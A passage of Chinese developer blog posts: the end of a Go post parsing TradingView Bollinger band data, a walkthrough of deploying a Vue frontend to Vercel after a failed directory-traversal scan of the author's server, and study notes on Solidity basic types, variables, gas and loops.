class="string">&quot;Pivot.M.Woodie.R1|120&quot;</span>,<span class="string">&quot;Pivot.M.Woodie.R2|120&quot;</span>,<span class="string">&quot;Pivot.M.Woodie.R3|120&quot;</span>,<span class="string">&quot;Pivot.M.Demark.S1|120&quot;</span>,<span class="string">&quot;Pivot.M.Demark.Middle|120&quot;</span>,<span class="string">&quot;Pivot.M.Demark.R1|120&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
<p>API返回的结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;TotalCount:<span class="number">1</span> Data:[&#123;S:BINANCE:BTCUSDT D:[<span class="number">0</span> <span class="number">0.46666667</span> <span class="number">0.93333333</span> <span class="number">63.51210379</span> <span class="number">59.16581691</span> <span class="number">69.6146242</span> <span class="number">68.77283822</span> <span class="number">66.12746449</span> <span class="number">69.58510338</span> <span class="number">74.54963546</span> <span class="number">57.42929389</span> <span class="number">26.81879053</span> <span class="number">26.58069963</span> <span class="number">17.69170375</span> <span class="number">24.38588284</span> <span class="number">19.30006705</span> <span class="number">120.68555882</span> <span class="number">118.20594118</span> -<span class="number">16.13</span> <span class="number">2.18</span> <span class="number">36.17025233</span> <span class="number">31.34725473</span> <span class="number">0</span> <span class="number">35.82221959</span> <span class="number">0</span> -<span class="number">24.16629056</span> <span class="number">0</span> <span class="number">77.60112301</span> <span class="number">0</span> <span class="number">55.57177607</span> <span class="number">17193.7</span> <span class="number">17172.53237578</span> <span class="number">17171.406</span> <span class="number">17159.0189826</span> <span class="number">17163.489</span> <span class="number">17127.90662836</span> <span class="number">17120.4805</span> <span class="number">17110.9071456</span> <span class="number">17065.16733333</span> <span class="number">17100.63520803</span> <span class="number">17082.0938</span> <span class="number">17090.49811186</span> <span class="number">17123.4215</span> <span class="number">17048.52958648</span> <span class="number">17064.7978</span> <span class="number">0</span> <span class="number">17072.69</span> <span class="number">1</span> <span class="number">17123.32935619</span> <span class="number">1</span> <span class="number">17171.53274074</span> <span class="number">17160.14</span> <span class="number">17235.4847</span> <span class="number">16981.06765146</span> <span class="number">17259.89334854</span> <span class="number">116.08352941</span> <span class="number">4857.7718</span> <span class="number">0.19545272</span> <span class="number">17155.5</span> <span class="number">17219.79</span>]&#125;]&#125; </span><br></pre></td></tr></table></figure>
<p>结合python版本的代码，帮助我们格式化返回的结果。最终可以获取到我想要的数据，布林带的上下界</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jerrychan807/go-indicator/lib&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Starting&quot;</span>)</span><br><span class="line"></span><br><span class="line">	jsonRes := lib.GetTradingViewResponse(<span class="string">&quot;crypto&quot;</span>, <span class="string">&quot;BINANCE&quot;</span>, <span class="string">&quot;BTCUSDT&quot;</span>, <span class="string">&quot;1h&quot;</span>)</span><br><span class="line">	analysisData := lib.ParseJsonData(jsonRes)</span><br><span class="line">	fmt.Println(<span class="string">&quot;analysisData: &quot;</span>, analysisData.BBupper)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Starting</span><br><span class="line">[*] response received 200</span><br><span class="line">[*] Api Json Data After handled: &#123;TotalCount:1 Data:[&#123;S:BINANCE:BTCUSDT D:[0.09090909 0.51212121 0.93333333 75.13228221 79.06565064 75.35647864 71.29840367 72.41126789 69.70505278 247.61844762 223.43410325 31.2990747 41.11855836 11.56486817 46.14259608 12.97791221 180.26205882 144.58582353 242.02 217.99 67.76216208 41.61843449 0 68.96940857 0 -23.55070738 0 407.69688095 0 60.72962433 17401.12 17300.75491719 17261.166 17237.86511799 17211.103 17174.10055491 17151.328 17143.76058678 17088.59366667 17121.24005569 17091.2652 17101.19327718 17127.5939 17054.34432142 17066.7484 0 17210.305 1 17169.71417103 1 17341.78392593 17427.82 17088.5372 16934.27480361 17368.38119639 118.20594118 8550.17222 -0.15320333 17357.74 17477.06]&#125;]&#125; </span><br><span class="line">BBupper:  17368.38119639</span><br><span class="line">BBlower:  16934.27480361</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>DevRecord</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>DevRecord</tag>
      </tags>
  </entry>
  <entry>
    <title>DevRecord-部署vue前端到Vervel上</title>
    <url>/2022/11477.html</url>
    <content><![CDATA[<h1>引言:</h1>
<p>之前开源项目的vue前端是直接运行在自己的服务器上,后来有一天网站打不开了,被hacker扫描攻击了,在对我的网站进行目录穿越,想要获取我的ssh信息…<br />
看报错,是没有利用成功的,没有穿越成功hhh…🤣🤣🤣<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220924152329.png" alt="20220924152329" /><br />
由于前端是base其他项目进行魔改的,不太熟悉前端，也不知道有没安全漏洞，吓得我赶紧先把前端进程停了。<br />
现在要把前端分离开，部署在免费的Vervel上…</p>
<h1>部署步骤：</h1>
<p>根据教程<a href="https://juejin.cn/post/7111246673703075870#heading-0">使用 Vercel 托管 Vue3 前端静态页面</a>,几行命令就快速部署成功了.神奇~</p>
<p>在项目根目录，全局安装 vercel 依赖</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i -g vercel</span><br></pre></td></tr></table></figure>
<p>在根目录创建 vercel.json 文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;rewrites&quot;</span>: [&#123;<span class="string">&quot;source&quot;</span>:  <span class="string">&quot;/api/(.*)&quot;</span>, <span class="string">&quot;destination&quot;</span>: <span class="string">&quot;/api&quot;</span>&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在根目录创建文件 <code>api\index.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>) <span class="comment">// 引入express</span></span><br><span class="line"><span class="keyword">const</span> app =<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&quot;../dist&quot;</span>)) <span class="comment">// 托管到dist目录(打包)</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app <span class="comment">// 导出app实例</span></span><br></pre></td></tr></table></figure>
<p>打开控制台，输入命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vercel login</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@foolisheddy vue-color-avatar]<span class="comment"># vercel login</span></span><br><span class="line">Vercel CLI 28.4.2</span><br><span class="line">&gt; Log <span class="keyword">in</span> to Vercel github</span><br><span class="line">&gt; Success! GitHub authentication complete <span class="keyword">for</span> czw_yeah@hotmail.com</span><br><span class="line">Congratulations! You are now logged <span class="keyword">in</span>. In order to deploy something, run `vercel`.</span><br><span class="line">💡  Connect your Git Repositories to deploy every branch push automatically (https://vercel.link/git).</span><br><span class="line">You have mail <span class="keyword">in</span> /var/spool/mail/root</span><br><span class="line">[root@foolisheddy vue-color-avatar]<span class="comment"># vercel</span></span><br><span class="line">Vercel CLI 28.4.2</span><br><span class="line">? Set up and deploy “/jcoin/crypto-young-nft/vue-color-avatar”? [Y/n] y</span><br><span class="line">? Which scope <span class="keyword">do</span> you want to deploy to? jerrychan807</span><br><span class="line">? Link to existing project? [y/N] n</span><br><span class="line">? What’s your project’s name? vue-color-avatar</span><br><span class="line">? In <span class="built_in">which</span> directory is your code located? ./</span><br><span class="line">Local settings detected <span class="keyword">in</span> vercel.json:</span><br><span class="line">Auto-detected Project Settings (Vite):</span><br><span class="line">- Build Command: vite build</span><br><span class="line">- Development Command: vite --port <span class="variable">$PORT</span></span><br><span class="line">- Install Command: `yarn install`, `pnpm install`, or `npm install`</span><br><span class="line">- Output Directory: dist</span><br><span class="line">? Want to modify these settings? [y/N] n</span><br><span class="line">🔗  Linked to jerrychan807/vue-color-avatar (created .vercel and added it to .gitignore)</span><br><span class="line">🔍  Inspect: .... [2s]</span><br><span class="line">✅  Production: https://vue-color-avatar-rosy.vercel.app [1m]</span><br><span class="line">📝  Deployed to production. Run `vercel --prod` to overwrite later (https://vercel.link/2F).</span><br><span class="line">💡  To change the domain or build <span class="built_in">command</span>, go to https://vercel.com/jerrychan807/vue-color-avatar/settings</span><br></pre></td></tr></table></figure>
<p>不到5分钟就搞定了,surprise!!!<br />
分配出来的域名是<code>https://vue-color-avatar-rosy.vercel.app</code>,可以正常访问。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220924153759.png" alt="20220924153759" />在vercel上看,也是部署成功了。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220924154339.png" alt="20220924154339" />后面再把域名解析修改一下,等生效<code>nft.foolisheddy.top</code></p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://juejin.cn/post/7111246673703075870#heading-0">使用 Vercel 托管 Vue3 前端静态页面</a></p>
</li>
<li class="lvl-2">
<p><a href="https://juejin.cn/post/7111242102578610189">使用 Vercel 来加速 Hexo 博客</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>DevRecord</category>
      </categories>
      <tags>
        <tag>DevRecord</tag>
      </tags>
  </entry>
  <entry>
    <title>Doc-SolidityByExample_1_Basics</title>
    <url>/2022/24924.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://web3dao-cn.github.io/solidity-example/">Solidity by Example</a> 学习记录基础语法的QuickView🧐🧐🧐</p>
<h1>Hello World:</h1>
<p><code>pragma</code> specifies the compiler version of Solidity.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// compiler version must be greater than or equal to 0.8.10 and less than 0.9.0</span></span><br><span class="line"><span class="comment">// 规定编译器的版本范围</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    string public greet = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就像python2或Python3，你最好声明出来，但<code>solidity</code>需要你强制声明，有规矩😅<br />
在线evm/在线运行环境支持多版本solidity，还挺好的，不像py2.x、py3.x还要自己运维server上的py版本。</p>
<h1>First App:</h1>
<p>Here is a simple contract that you can get, increment and decrement the count store in this contract.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Counter</span> &#123;</span><br><span class="line">    uint public count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to get the current count</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to increment count by 1</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">inc</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Function to decrement count by 1</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">dec</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        count -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Primitive Data Types:</h1>
<p>Here we introduce you to some primitive(基本) data types available in Solidity.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>boolean</p>
</li>
<li class="lvl-2">
<p>uint/int</p>
</li>
<li class="lvl-2">
<p>address</p>
</li>
</ul>
<p>基础知识:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bit = Binary digIT = 0 or 1</span><br><span class="line">Byte = a sequence of 8 bits = 00000000, 00000001, ..., or 11111111</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Primitives</span> &#123;</span><br><span class="line">    bool public boo = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    uint stands for unsigned integer, meaning non negative integers</span></span><br><span class="line"><span class="comment">    different sizes are available </span></span><br><span class="line"><span class="comment">        uint8   ranges from 0 to 2 ** 8 - 1</span></span><br><span class="line"><span class="comment">        uint16  ranges from 0 to 2 ** 16 - 1</span></span><br><span class="line"><span class="comment">        ...</span></span><br><span class="line"><span class="comment">        uint256 ranges from 0 to 2 ** 256 - 1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 无符号uint,无负数</span></span><br><span class="line">    <span class="comment">// uintX  X代表Bit 位，8bit= 1byte,uint256(32byte)默认就是一个Storage slot的长度</span></span><br><span class="line">    <span class="comment">// uint 是uint256的别名</span></span><br><span class="line">    </span><br><span class="line">    uint8 public u8 = <span class="number">1</span>;</span><br><span class="line">    uint public u256 = <span class="number">456</span>;</span><br><span class="line">    uint public u = <span class="number">123</span>; <span class="comment">// uint is an alias for uint256 u</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Negative numbers are allowed for int types.</span></span><br><span class="line"><span class="comment">    Like uint, different ranges are available from int8 to int256</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    int256 ranges from -2 ** 255 to 2 ** 255 - 1</span></span><br><span class="line"><span class="comment">    int128 ranges from -2 ** 127 to 2 ** 127 - 1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// int可代表负数</span></span><br><span class="line">    <span class="comment">// 可以定义的范围是：int8~int256，8为步长，也就是一个byte为步长</span></span><br><span class="line">    </span><br><span class="line">    int8 public i8 = -<span class="number">1</span>;</span><br><span class="line">    int public i256 = <span class="number">456</span>;</span><br><span class="line">    int public i = -<span class="number">123</span>; <span class="comment">// int is same as int256</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// minimum and maximum of int</span></span><br><span class="line">    int public minInt = <span class="title function_">type</span>(int).<span class="property">min</span>;</span><br><span class="line">    int public maxInt = <span class="title function_">type</span>(int).<span class="property">max</span>;</span><br><span class="line"></span><br><span class="line">    address public addr = <span class="number">0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    In Solidity, the data type byte represent a sequence of bytes. </span></span><br><span class="line"><span class="comment">    Solidity presents two type of bytes types :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     - fixed-sized byte arrays 固定长度字节数组 byteX</span></span><br><span class="line"><span class="comment">     - dynamically-sized byte arrays. 动态长度字节数组 bytes、byte[]</span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">     The term bytes in Solidity represents a dynamic array of bytes. </span></span><br><span class="line"><span class="comment">     It’s a shorthand for byte[] .</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    bytes1 a = <span class="number">0xb5</span>; <span class="comment">//  [10110101]</span></span><br><span class="line">    bytes1 b = <span class="number">0x56</span>; <span class="comment">//  [01010110]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 只声明，未赋值的变量都有默认值</span></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="comment">// Unassigned variables have a default value</span></span><br><span class="line">    bool public defaultBoo; <span class="comment">// false</span></span><br><span class="line">    uint public defaultUint; <span class="comment">// 0</span></span><br><span class="line">    int public defaultInt; <span class="comment">// 0</span></span><br><span class="line">    address public defaultAddr; <span class="comment">// 0x0000000000000000000000000000000000000000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在EVM中，32是一个重要的数字，要记住！<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220710095620.png" alt="20220710095620" /><br />
每个存储槽Storage slot可以存32byte的数据</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220712105238.png" alt="20220712105238" /></p>
<p>整数值、布尔值、地址值这些固定长度的基本类型，在定义长度的时候都和32byte 息息相关。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>整数范围 uint8(Bit)<sub>uint256(Bit):最小1byte</sub>最大32byte</p>
</li>
<li class="lvl-2">
<p>uint = uint256:32byte</p>
</li>
</ul>
<p>地址值蛮特别，别的编程语言里没有。</p>
<h1>Variables</h1>
<p>There are 3 types of variables in Solidity<br />
从作用域、存储位置去区分</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>local 局部变量</p>
</li>
<li class="lvl-3">
<p>declared inside a function</p>
</li>
<li class="lvl-3">
<p>not stored on the blockchain</p>
</li>
<li class="lvl-2">
<p>state 状态变量</p>
</li>
<li class="lvl-3">
<p>declared outside a function</p>
</li>
<li class="lvl-3">
<p>stored on the blockchain</p>
</li>
<li class="lvl-2">
<p>global (provides information about the blockchain) 全局变量</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Variables</span> &#123;</span><br><span class="line">    <span class="comment">// State variables are stored on the blockchain.</span></span><br><span class="line">    string public text = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    uint public num = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="comment">// Local variables are not saved to the blockchain.</span></span><br><span class="line">        uint i = <span class="number">456</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Here are some global variables</span></span><br><span class="line">        uint timestamp = block.<span class="property">timestamp</span>; <span class="comment">// Current block timestamp</span></span><br><span class="line">        address sender = msg.<span class="property">sender</span>; <span class="comment">// address of the caller</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>State Variable</code>声明的位置有点像py里的全局变量/class变量，但特点在于它是存储在blockchain上的，一旦存储在blockchain,那全世界都可以访问了，应该叫<code>World State Variable</code>😂</p>
<h1>Constants</h1>
<p>Constants are variables that cannot be modified.<br />
Their value is hard coded and using constants can save gas cost.</p>
<p>不可修改、省gas</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Constants</span> &#123;</span><br><span class="line">    <span class="comment">// 格式约定：对常量大写</span></span><br><span class="line">    <span class="comment">// coding convention to uppercase constant variables</span></span><br><span class="line">    address public constant <span class="variable constant_">MY_ADDRESS</span> = <span class="number">0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc</span>;</span><br><span class="line">    uint public constant <span class="variable constant_">MY_UINT</span> = <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>常量/不可变量似乎跟别的编程语言没有啥区别，但考虑到存储位置的不同：别的编程语言一个常量可能就存储在单机server上，但由于是状态变量存在world State/blockchain上的，分布式存储的，存储消耗是要算一个乘法的，就要好好计价了(gas敏感)，能省则省。</p>
<h1>Immutable</h1>
<p>Immutable variables are like constants. Values of immutable variables can be set inside the constructor but cannot be modified afterwards.<br />
跟<code>constant</code>的区别在于赋值的位置不一样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Immutable</span> &#123;</span><br><span class="line">    <span class="comment">// 格式约定：对常量大写</span></span><br><span class="line">    <span class="comment">// coding convention to uppercase constant variables</span></span><br><span class="line">    address public immutable <span class="variable constant_">MY_ADDRESS</span>;</span><br><span class="line">    uint public immutable <span class="variable constant_">MY_UINT</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">uint _myUint</span>) &#123;</span><br><span class="line">        <span class="variable constant_">MY_ADDRESS</span> = msg.<span class="property">sender</span>;</span><br><span class="line">        <span class="variable constant_">MY_UINT</span> = _myUint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Reading and Writing to a State Variable</h1>
<p>To write or update a state variable you need to send a <code>transaction</code>.<br />
On the other hand, you can read state variables, for free, without any transaction fee.</p>
<p>对状态变量的读写，读免费， 写/改变其状态的话，要发交易/要耗gas。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleStorage</span> &#123;</span><br><span class="line">    <span class="comment">// State variable to store a number</span></span><br><span class="line">    uint public num;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// You need to send a transaction to write to a state variable.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">uint _num</span>) public &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// You can read from a state variable without sending a transaction.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样要考虑到blockchain分布式多节点的问题，表面看似只改一个状态变量的值，但改了世界各地节点的存储。</p>
<h1>Ether and Wei</h1>
<p>Transactions are paid with ether. 交易以ether单位计价<br />
Similar to how one dollar is equal to 100 cent, one ether is equal to 1018 wei.<br />
1美元=100美分，1Ether=1e18Wei，solidity自定义了自己的单位</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">EtherUnits</span> &#123;</span><br><span class="line">    uint public oneWei = <span class="number">1</span> wei;</span><br><span class="line">    <span class="comment">// 1 wei is equal to 1</span></span><br><span class="line">    bool public isOneWei = <span class="number">1</span> wei == <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    uint public oneEther = <span class="number">1</span> ether;</span><br><span class="line">    <span class="comment">// 1 ether is equal to 10^18 wei</span></span><br><span class="line">    bool public isOneEther = <span class="number">1</span> ether == <span class="number">1e18</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Gas and Gas Price：</h1>
<p>How much <code>ether</code> do you need to pay for a transaction?<br />
You pay <code>gas spent * gas price</code>(数量*愿意出的单价) amount of <code>ether</code>, where</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>gas</code> is a <strong>unit</strong> of computation 计算单位</p>
</li>
<li class="lvl-2">
<p><code>gas spent</code> is the <strong>total amount</strong> of gas used in a transaction</p>
</li>
<li class="lvl-2">
<p><code>gas price</code> is how much ether you are willing to pay per gas</p>
</li>
</ul>
<p>|  keyword | 含义 |<br />
| — | — |— |<br />
| gas | 计价单位 |<br />
| gas spent | 交易里花费了多少份gas |   |<br />
| gas price | gas的单价 |   |</p>
<p>Transactions with higher gas price have higher priority to be included in a block.<br />
Unspent gas will be refunded.</p>
<p>有点像在拍卖东西，你愿意出的拍卖价(筹码数量 x 筹码价格)</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>A: 筹码数量10 x 筹码价格10=100</p>
</li>
<li class="lvl-2">
<p>B: 筹码数量10 x 筹码价格20=200</p>
</li>
<li class="lvl-2">
<p>C: 筹码数量20 x 筹码价格10=200</p>
</li>
</ul>
<p>然后价高者得，优先处理你的交易。拍卖价的计算公式：<code>gas spent * gas price</code> ，为了加快交易，你可以提高筹码数量或每个筹码的价格，最终拍卖价变高就行。</p>
<blockquote>
<p>以太坊经常被描述为“世界计算机”，以太坊是一个开源的，全球分散的计算基础设施，执行称为智能合约的程序。它使用区块链来同步和存储系统的状态变化，以及称为<strong>以太网的加密货币来计量和约束执行资源成本。</strong>——《mastering-ethereum》</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220712113140.png" alt="20220712113140" /></p>
<h2 id="Gas-Limit">Gas Limit</h2>
<p>There are 2 upper bounds to the amount of gas you can spend</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>gas limit</code> (max amount of gas you’re willing to use for your transaction, set by you)</p>
</li>
<li class="lvl-2">
<p><code>block gas limit</code> (max amount of gas allowed in a block, set by the network)</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Gas</span> &#123;</span><br><span class="line">    uint public i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Using up all of the gas that you send causes your transaction to fail.</span></span><br><span class="line">    <span class="comment">// State changes are undone.</span></span><br><span class="line">    <span class="comment">// Gas spent are not refunded.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">forever</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="comment">// Here we run a loop until all of the gas are spent</span></span><br><span class="line">        <span class="comment">// and the transaction fails</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>If / Else:</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">IfElse</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">uint x</span>) public pure returns (uint) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">20</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">ternary</span>(<span class="params">uint _x</span>) public pure returns (uint) &#123;</span><br><span class="line">        <span class="comment">// if (_x &lt; 10) &#123;</span></span><br><span class="line">        <span class="comment">//     return 1;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// return 2;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// shorthand way to write if / else statement</span></span><br><span class="line">        <span class="keyword">return</span> _x &lt; <span class="number">10</span> ? <span class="number">1</span> : <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>For and While Loop:</h1>
<p>Solidity supports for, while, and do while loops.<br />
Don’t write loops that are unbounded as this can hit the gas limit, causing your transaction to fail.<br />
For the reason above, while and do while loops are rarely used.</p>
<p>很少用<code>while</code>和<code>do while</code>每个opcode都有其gas定价，过多循环，只会累加gas，很可能达到block的gas limit导致交易失败。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Loop</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">loop</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="comment">// for loop</span></span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="comment">// Skip to next iteration with continue</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="comment">// Exit loop with 